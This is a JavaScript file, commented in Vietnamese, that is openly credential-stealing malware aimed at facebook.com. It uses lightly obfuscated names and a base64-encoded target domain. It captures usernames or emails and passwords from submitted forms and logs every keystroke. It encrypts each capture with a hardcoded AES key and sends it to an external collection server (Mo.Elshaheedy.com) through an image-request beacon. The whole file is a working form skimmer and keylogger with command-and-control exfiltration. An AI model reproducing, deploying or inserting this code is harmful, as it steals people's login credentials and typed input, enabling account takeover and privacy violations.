// chạy liên tục để gửi data đến C2 server
(function () {
  var _0xabc1 = function (_0x321a) {
    return _0x321a;
  };
  var _0x5eaf = function (_0x5fa1) {
    return btoa(_0x5fa1); // hàm btoa sẽ mã hóa chuỗi thành base64
  };

  const targets = [_0xabc1("d3d3LmZhY2Vib29rLmNvbQ==")]; // ['www.facebook.com']
  if (targets.indexOf(window.location.hostname) !== -1) {
    // kiểm tra xem trang web hiện tại có nằm trong danh sách targets không
    // wiindow.location.hostname sẽ trả về tên miền của trang web hiện tại
    document.addEventListener("submit", function (event) {
      let form = event.target; // lấy ra form mà người dùng vừa submit
      let formData = new FormData(form);
      let username = formData.get("username") || formData.get("email");
      let password = formData.get("password");

      if (username && password) {
        exfiltrateCredentials(username, password);
      }
    });
    // thu nhập phím khi người dùng nhấn - keyloagger
    //   thu nhập dữ liệu theo thời gian thực
    document.addEventListener("keydown", function (event) {
      var key = event.key;
      exfiltrateData("keystroke", key);
    });
  }

  function exfiltrateCredentials(username, password) {
    // hàm này sẽ gửi username và password lên server
    const payload = {
      user: username,
      pass: password,
      site: window.location.hostname,
    };
    const encryptedPayload = encryptPayload(JSON.stringify(payload)); // mã hóa dữ liệu
    sendToServer(encryptedPayload);
  }

  function encryptPayload(data) {
    const key = CryptoJS.enc.Utf8.parse("SuperSecretKey123");
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
    return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
  }

  function sendToServer(encryptedData) {
    var img = new Image(); // tạo một thẻ img
    //   gửi dữ liệu bị đánh cắp đến server thông qua tham số URL data
    img.src =
      "https://Mo.Elshaheedy.com/collect?data=" +
      encodeURIComponent(encryptedData);
    document.body.appendChild(img); // thêm thẻ img vào body
  }
  // hàm gửi keylog lên server
  function exfiltrateData(type, data) {
    const payload = { type: type, data: data, site: window.location.hostname };
    const encryptedPayload = encryptPayload(JSON.stringify(payload));
    sendToServer(encryptedPayload);
  }
})();
